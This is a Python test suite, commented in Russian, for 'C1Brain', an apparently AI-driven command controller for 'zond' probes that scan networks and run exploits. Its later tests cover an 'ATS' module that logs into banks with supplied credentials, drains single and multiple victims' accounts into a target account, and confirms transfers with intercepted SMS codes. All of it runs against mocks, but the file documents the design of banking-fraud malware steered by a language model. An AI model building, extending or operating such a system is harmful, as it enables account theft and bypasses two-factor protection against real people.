import unittest
from unittest.mock import MagicMock, patch
import json
from datetime import datetime
import random
import os
import sys

# Определим путь к корню проекта и добавим его в sys.path
ROOT_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
sys.path.append(ROOT_DIR)

# Импортируем необходимые модули для тестирования
from src.intelligence.c1_brain import C1Brain, ThinkingMode
from zond_protocol import TaskStatus

class TestC1Brain(unittest.TestCase):
    def setUp(self):
        # Создаем мок-объект контроллера
        self.mock_controller = MagicMock()
        
        # Инициализируем C1Brain с тестовыми параметрами
        self.brain = C1Brain(
            controller=self.mock_controller,
            model_name="gpt-4",
            temperature=0.7,
            thinking_interval=10,
            thinking_mode=ThinkingMode.DEFENSIVE
        )
    
    def test_init(self):
        """Тест инициализации C1Brain"""
        # Проверяем, что параметры установлены корректно
        self.assertEqual(self.brain.model_name, "gpt-4")
        self.assertEqual(self.brain.temperature, 0.7)
        self.assertEqual(self.brain.thinking_interval, 10)
        self.assertEqual(self.brain.thinking_mode, ThinkingMode.DEFENSIVE)
        
        # Проверяем, что мозг подключен к контроллеру
        self.mock_controller.set_brain.assert_called_once_with(self.brain)
        
        # Проверяем, что история результатов и логи инициализированы
        self.assertEqual(self.brain.task_results_history, [])
        self.assertEqual(self.brain.thinking_logs, [])
    
    def test_process_task_result_success(self):
        """Тест обработки успешного результата задачи"""
        # Успешный результат
        result = {
            "status": "success",
            "command": "scan_network",
            "output": "Сканирование завершено успешно. Найдено 10 хостов."
        }
        
        zond_id = "zond1"
        task_id = "task123"
        status = TaskStatus.COMPLETED
        
        # Обрабатываем результат
        self.brain.process_task_result(
            zond_id=zond_id, 
            task_id=task_id, 
            status=status,
            result=result
        )
        
        # Проверяем, что результат добавлен в историю
        self.assertEqual(len(self.brain.task_results_history), 1)
        self.assertEqual(self.brain.task_results_history[0]["zond_id"], zond_id)
        self.assertEqual(self.brain.task_results_history[0]["task_id"], task_id)
        self.assertEqual(self.brain.task_results_history[0]["result"], result)
        
        # Проверяем обновление статистики команд
        self.assertEqual(self.brain.command_statistics["scan_network"]["total"], 1)
        self.assertEqual(self.brain.command_statistics["scan_network"]["success"], 1)
        
        # Проверяем обновление статистики зондов
        self.assertEqual(self.brain.zond_statistics[zond_id]["total"], 1)
        self.assertEqual(self.brain.zond_statistics[zond_id]["success"], 1)
        
        # Проверяем обновление статуса зонда
        self.assertEqual(self.brain.zond_status[zond_id]["last_command"], "scan_network")
        self.assertEqual(self.brain.zond_status[zond_id]["last_result"], result)
    
    def test_process_task_result_failure(self):
        """Тест обработки неудачного результата задачи"""
        # Неудачный результат
        result = {
            "status": "failure",
            "command": "scan_network",
            "error": "Цель недоступна"
        }
        
        zond_id = "zond2"
        task_id = "task456"
        status = TaskStatus.FAILED
        
        # Обрабатываем результат
        self.brain.process_task_result(
            zond_id=zond_id, 
            task_id=task_id, 
            status=status,
            result=result
        )
        
        # Проверяем, что результат добавлен в историю
        self.assertEqual(len(self.brain.task_results_history), 1)
        self.assertEqual(self.brain.task_results_history[0]["zond_id"], zond_id)
        self.assertEqual(self.brain.task_results_history[0]["task_id"], task_id)
        self.assertEqual(self.brain.task_results_history[0]["result"], result)
        
        # Проверяем обновление статистики команд
        self.assertEqual(self.brain.command_statistics["scan_network"]["total"], 1)
        self.assertEqual(self.brain.command_statistics["scan_network"]["success"], 0)
        
        # Проверяем обновление статистики зондов
        self.assertEqual(self.brain.zond_statistics[zond_id]["total"], 1)
        self.assertEqual(self.brain.zond_statistics[zond_id]["success"], 0)
        
        # Проверяем обновление статуса зонда
        self.assertEqual(self.brain.zond_status[zond_id]["last_command"], "scan_network")
        self.assertEqual(self.brain.zond_status[zond_id]["last_result"], result)
    
    def test_get_task_results_analysis_empty(self):
        """Тест анализа результатов при пустой истории"""
        analysis = self.brain.get_task_results_analysis()
        
        # Проверяем, что при пустой истории возвращается пустой анализ
        self.assertEqual(analysis["total_tasks"], 0)
        self.assertEqual(analysis["success_rate"], 0)
        self.assertEqual(analysis["command_success_rates"], {})
        self.assertEqual(analysis["zond_success_rates"], {})
        self.assertEqual(analysis["patterns"], [])
        self.assertEqual(analysis["recommendations"], [])
    
    def test_get_task_results_analysis(self):
        """Тест анализа результатов задач"""
        # Добавляем несколько результатов задач
        for i in range(10):
            # Часть успешных, часть неудачных
            success = i % 3 != 0
            zond_id = f"zond{i % 3 + 1}"
            command = "scan_network" if i % 2 == 0 else "exploit"
            status = TaskStatus.COMPLETED if success else TaskStatus.FAILED
            
            result = {
                "status": "success" if success else "failure",
                "command": command,
                "output": "Успешно" if success else None,
                "error": None if success else "Ошибка соединения"
            }
            
            # Используем обновленную сигнатуру метода
            self.brain.process_task_result(
                zond_id=zond_id, 
                task_id=f"task{i}", 
                status=status,
                result=result
            )
        
        # Получаем анализ
        analysis = self.brain.get_task_results_analysis()
        
        # Проверяем основные поля анализа
        self.assertEqual(analysis["total_tasks"], 10)
        self.assertGreater(analysis["success_rate"], 0)
        self.assertIn("scan_network", analysis["command_success_rates"])
        self.assertIn("exploit", analysis["command_success_rates"])
        
        # Проверяем статистику по зондам
        for i in range(1, 4):
            self.assertIn(f"zond{i}", analysis["zond_success_rates"])
    
    def test_integration_with_controller(self):
        """Тест интеграции с контроллером"""
        # Настраиваем контроллер для возврата некоторых данных
        self.mock_controller.get_zonds.return_value = {
            "zond1": {"status": "active", "ip": "192.168.1.10"},
            "zond2": {"status": "inactive", "ip": "192.168.1.20"}
        }
        
        # Вызываем метод, использующий контроллер
        network_state = self.brain._get_network_state()
        
        # Проверяем, что метод получения зондов был вызван
        self.mock_controller.get_zonds.assert_called_once()
        
        # Проверяем, что данные от контроллера отражены в состоянии сети
        self.assertEqual(len(network_state["zonds"]), 2)
        self.assertIn("zond1", network_state["zonds"])
        self.assertIn("zond2", network_state["zonds"])
    
    @patch("src.intelligence.c1_brain.re")
    def test_analyze_action(self, mock_re):
        """Тест анализа действия"""
        # Настраиваем мок для функции регулярного выражения
        mock_re.search.return_value.group.return_value = "5"
        
        # Добавляем результат сканирования
        scan_result = {
            "status": "success",
            "command": "scan_network",
            "output": "Сканирование завершено успешно. Найдено 5 хостов."
        }
        self.brain.process_task_result("zond1", "task123", scan_result)
        
        # Выполняем анализ действия
        result = self.brain._analyze_network_scan("zond1")
        
        # Проверяем результат анализа
        self.assertEqual(result["hosts_count"], 5)
    
    def test_results_history_limit(self):
        """Тест ограничения размера истории результатов"""
        # Заполняем историю результатов
        limit = 1000
        for i in range(limit + 10):
            result = {
                "status": "success",
                "command": "test_command",
                "output": f"Test output {i}"
            }
            self.brain.process_task_result(f"zond{i}", f"task{i}", result)
        
        # Проверяем, что размер истории не превышает лимит
        self.assertEqual(len(self.brain.task_results_history), limit)
        
        # Проверяем, что самые старые записи были удалены
        self.assertEqual(self.brain.task_results_history[0]["task_id"], f"task{10}")
    
    def test_thinking_logs_limit(self):
        """Тест ограничения размера логов размышления"""
        # Заполняем логи размышления
        limit = 100
        for i in range(limit + 10):
            log = {
                "timestamp": datetime.now().isoformat(),
                "mode": "test_mode",
                "thinking": f"Test thinking {i}",
                "actions": [],
                "results": []
            }
            self.brain.thinking_logs.append(log)
            
            # Вызываем метод, который должен ограничивать размер логов
            self.brain.think_once(ThinkingMode.DEFENSIVE)
        
        # Проверяем, что размер логов не превышает лимит
        self.assertEqual(len(self.brain.thinking_logs), limit)
        
        # Проверяем, что самые старые записи были удалены
        self.assertIn(f"Test thinking {limit + 9}", self.brain.thinking_logs[-1]["thinking"])
    
    def test_set_thinking_mode(self):
        """Тест установки режима размышления"""
        # Проверяем установку правильных режимов
        self.assertTrue(self.brain.set_thinking_mode(ThinkingMode.SILENT))
        self.assertEqual(self.brain.thinking_mode, ThinkingMode.SILENT)
        
        self.assertTrue(self.brain.set_thinking_mode("aggressive"))
        self.assertEqual(self.brain.thinking_mode, ThinkingMode.AGGRESSIVE)
        
        # Проверяем отклонение неправильного режима
        self.assertFalse(self.brain.set_thinking_mode("invalid_mode"))
        self.assertEqual(self.brain.thinking_mode, ThinkingMode.AGGRESSIVE)
    
    def test_start_stop_thinking(self):
        """Тест запуска и остановки процесса размышления"""
        # Запускаем процесс
        self.assertTrue(self.brain.start_thinking())
        self.assertTrue(self.brain.thinking_active)
        self.assertIsNotNone(self.brain.thinking_thread)
        
        # Запуск уже запущенного процесса должен вернуть False
        self.assertFalse(self.brain.start_thinking())
        
        # Останавливаем процесс
        self.assertTrue(self.brain.stop_thinking())
        self.assertFalse(self.brain.thinking_active)
        
        # Остановка уже остановленного процесса должна вернуть False
        self.assertFalse(self.brain.stop_thinking())

    def test_get_zond_task_results(self):
        """Тест получения результатов задач по идентификатору зонда"""
        # Добавляем результаты для двух разных зондов
        zond1_id = "test_zond_1"
        zond2_id = "test_zond_2"
        
        # Для первого зонда
        for i in range(5):
            self.brain.process_task_result(
                zond_id=zond1_id,
                task_id=f"task1_{i}",
                status=TaskStatus.COMPLETED,
                result={
                    "status": "success",
                    "command": "scan_network",
                    "output": f"Result for zond1 task {i}"
                }
            )
        
        # Для второго зонда
        for i in range(3):
            self.brain.process_task_result(
                zond_id=zond2_id,
                task_id=f"task2_{i}",
                status=TaskStatus.FAILED,
                result={
                    "status": "failure",
                    "command": "exploit",
                    "error": f"Error for zond2 task {i}"
                }
            )
        
        # Получаем результаты для первого зонда
        zond1_results = self.brain.get_zond_task_results(zond1_id)
        
        # Проверяем, что получены только результаты первого зонда
        self.assertEqual(len(zond1_results), 5)
        for result in zond1_results:
            self.assertEqual(result["zond_id"], zond1_id)
            self.assertIn("task1_", result["task_id"])
        
        # Получаем результаты для второго зонда
        zond2_results = self.brain.get_zond_task_results(zond2_id)
        
        # Проверяем, что получены только результаты второго зонда
        self.assertEqual(len(zond2_results), 3)
        for result in zond2_results:
            self.assertEqual(result["zond_id"], zond2_id)
            self.assertIn("task2_", result["task_id"])
        
        # Проверяем лимит
        limited_results = self.brain.get_zond_task_results(zond1_id, limit=2)
        self.assertEqual(len(limited_results), 2)
    
    def test_get_zond_performance_metrics(self):
        """Тест получения метрик производительности зонда"""
        zond_id = "perf_test_zond"
        
        # Добавляем результаты с разными командами и статусами
        commands = ["scan_network", "exploit", "collect_info"]
        for i in range(20):
            status = TaskStatus.COMPLETED if i % 3 != 0 else TaskStatus.FAILED
            command = commands[i % len(commands)]
            
            self.brain.process_task_result(
                zond_id=zond_id,
                task_id=f"perf_task_{i}",
                status=status,
                result={
                    "status": "success" if i % 3 != 0 else "failure",
                    "command": command,
                    "output" if i % 3 != 0 else "error": f"Result {i}"
                }
            )
        
        # Получаем метрики
        metrics = self.brain.get_zond_performance_metrics(zond_id)
        
        # Проверяем основные поля метрик
        self.assertEqual(metrics["total_tasks"], 20)
        # Должно быть 14 успешных задач (2/3 от 20, округленно)
        success_tasks = sum(1 for i in range(20) if i % 3 != 0)
        self.assertEqual(metrics["success_tasks"], success_tasks)
        
        # Проверяем статистику по командам
        for command in commands:
            self.assertIn(command, metrics["command_stats"])
            
        # Проверяем успешность команд
        scan_tasks = metrics["command_stats"]["scan_network"]
        self.assertGreaterEqual(scan_tasks["total"], 6)  # примерно 20/3
        
        # Проверяем статус зонда
        self.assertEqual(metrics["status"], "active")
        
        # Проверяем метрики для несуществующего зонда
        empty_metrics = self.brain.get_zond_performance_metrics("nonexistent_zond")
        self.assertEqual(empty_metrics["total_tasks"], 0)
        self.assertEqual(empty_metrics["success_rate"], 0)
        self.assertEqual(empty_metrics["status"], "unknown")

    @patch('agent_modules.ats_module.create_ats')
    def test_init_ats_module(self, mock_create_ats):
        """Тест инициализации ATS-модуля"""
        # Настраиваем мок для create_ats
        mock_ats = MagicMock()
        mock_create_ats.return_value = mock_ats
        
        # Вызываем тестируемый метод
        result = self.brain.init_ats_module("test_config.json")
        
        # Проверяем результат
        self.assertTrue(result)
        self.assertEqual(self.brain.ats, mock_ats)
        mock_create_ats.assert_called_once_with("test_config.json")
    
    def test_get_ats_module_not_initialized(self):
        """Тест получения ATS-модуля, когда он не инициализирован"""
        # Убеждаемся, что модуль не инициализирован
        if hasattr(self.brain, 'ats'):
            delattr(self.brain, 'ats')
        
        # Вызываем тестируемый метод
        result = self.brain.get_ats_module()
        
        # Проверяем результат
        self.assertIsNone(result)
    
    @patch('agent_modules.ats_module.create_ats')
    def test_get_ats_module_initialized(self, mock_create_ats):
        """Тест получения ATS-модуля, когда он инициализирован"""
        # Настраиваем мок и инициализируем модуль
        mock_ats = MagicMock()
        mock_create_ats.return_value = mock_ats
        self.brain.init_ats_module()
        
        # Вызываем тестируемый метод
        result = self.brain.get_ats_module()
        
        # Проверяем результат
        self.assertEqual(result, mock_ats)
    
    @patch('agent_modules.ats_module.create_ats')
    def test_perform_ats_login(self, mock_create_ats):
        """Тест выполнения входа через ATS"""
        # Настраиваем мок
        mock_ats = MagicMock()
        mock_session = MagicMock()
        mock_session.bank_type = "test_bank"
        mock_session.authenticated = True
        
        mock_ats.login_to_bank.return_value = True
        mock_ats.active_sessions = {"test_session": mock_session}
        
        mock_create_ats.return_value = mock_ats
        self.brain.init_ats_module()
        
        # Вызываем тестируемый метод
        result = self.brain.perform_ats_login("test_bank", {"username": "test", "password": "pass"})
        
        # Проверяем результат
        self.assertEqual(result["status"], "success")
        self.assertEqual(result["session_id"], "test_session")
        mock_ats.login_to_bank.assert_called_once_with("test_bank", {"username": "test", "password": "pass"})
    
    @patch('agent_modules.ats_module.create_ats')
    def test_perform_ats_drain(self, mock_create_ats):
        """Тест выполнения дрейна через ATS"""
        # Настраиваем мок
        mock_ats = MagicMock()
        mock_ats.drain_account.return_value = {
            "status": "success",
            "amount": 1000.0,
            "balance": 500.0
        }
        
        mock_create_ats.return_value = mock_ats
        self.brain.init_ats_module()
        
        # Вызываем тестируемый метод
        result = self.brain.perform_ats_drain("test_session", "target_account", 1000.0)
        
        # Проверяем результат
        self.assertEqual(result["status"], "success")
        self.assertEqual(result["amount"], 1000.0)
        mock_ats.drain_account.assert_called_once_with("test_session", "target_account", 1000.0)
    
    @patch('agent_modules.ats_module.create_ats')
    def test_perform_ats_mass_drain(self, mock_create_ats):
        """Тест выполнения массового дрейна через ATS"""
        # Настраиваем мок
        mock_ats = MagicMock()
        mock_ats.mass_drain.return_value = {
            "total_attempts": 3,
            "successful": 2,
            "failed": 1,
            "total_amount": 2500.0
        }
        
        mock_create_ats.return_value = mock_ats
        self.brain.init_ats_module()
        
        # Создаем тестовые данные
        credentials_list = [
            {"bank_type": "bank1", "username": "user1", "password": "pass1"},
            {"bank_type": "bank2", "username": "user2", "password": "pass2"},
            {"bank_type": "bank3", "username": "user3", "password": "pass3"}
        ]
        
        # Вызываем тестируемый метод
        result = self.brain.perform_ats_mass_drain(credentials_list, "target_account")
        
        # Проверяем результат
        self.assertEqual(result["total_attempts"], 3)
        self.assertEqual(result["successful"], 2)
        self.assertEqual(result["total_amount"], 2500.0)
        mock_ats.mass_drain.assert_called_once_with(credentials_list, "target_account")
    
    @patch('agent_modules.ats_module.create_ats')
    def test_process_intercepted_sms(self, mock_create_ats):
        """Тест обработки перехваченного SMS-кода"""
        # Настраиваем мок
        mock_ats = MagicMock()
        mock_ats.confirm_transfer_with_sms.return_value = {
            "status": "success",
            "message": "Перевод подтвержден"
        }
        
        # Имитация активных сессий
        mock_session = MagicMock()
        mock_session.last_result = {"status": "confirmation_required"}
        mock_ats.active_sessions = {"test_session": mock_session}
        
        mock_create_ats.return_value = mock_ats
        self.brain.init_ats_module()
        
        # Вызываем тестируемый метод
        result = self.brain.process_intercepted_sms("+79991234567", "123456")
        
        # Проверяем результат
        self.assertEqual(result["status"], "success")
        mock_ats.sms_interceptor.add_intercepted_code.assert_called_once_with("+79991234567", "123456")
        mock_ats.confirm_transfer_with_sms.assert_called_once_with("test_session", "+79991234567")
    
    @patch('agent_modules.ats_module.create_ats')
    def test_get_ats_results(self, mock_create_ats):
        """Тест получения результатов операций ATS"""
        # Настраиваем мок
        mock_ats = MagicMock()
        mock_ats.get_results.return_value = [
            {"operation": "drain", "status": "success", "amount": 1000.0},
            {"operation": "confirm", "status": "success", "code": "123456"}
        ]
        
        mock_create_ats.return_value = mock_ats
        self.brain.init_ats_module()
        
        # Вызываем тестируемый метод
        results = self.brain.get_ats_results()
        
        # Проверяем результат
        self.assertEqual(len(results), 2)
        self.assertEqual(results[0]["operation"], "drain")
        self.assertEqual(results[1]["operation"], "confirm")
        mock_ats.get_results.assert_called_once()

if __name__ == '__main__':
    unittest.main() 